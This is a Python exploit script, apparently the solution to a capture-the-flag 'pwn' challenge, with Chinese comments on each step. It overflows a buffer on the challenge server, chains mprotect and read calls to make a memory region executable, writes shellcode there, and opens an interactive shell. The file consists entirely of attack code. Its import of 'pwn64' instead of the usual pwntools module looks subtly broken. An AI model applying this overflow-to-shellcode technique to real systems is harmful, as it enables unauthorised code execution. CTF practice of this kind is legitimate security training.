# -*- coding: UTF-8 -*-
from pwn64 import *
u=remote("pwn.challenge.ctf.show",28313)
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
payload = b'a'*(0x12+4)
payload += p32(0x0806cdd0) # mprotect函数地址
payload += p32(0x08056194) # 3 pop 1 ret地址
payload += p32(0x080da000) # 需要修改的内存的起始地址
payload += p32(0x1000) # 修改内存空间的大小
payload += p32(0x7) # 需要赋予的权限
payload += p32(0x806bee0) # read函数地址
payload += p32(0x080da000) # read函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)
payload += p32(0x0)
payload += p32(0x080da000) # shellcode地址
payload += p32(len(shellcode))
u.sendline(payload)
u.sendline(shellcode)
u.interactive()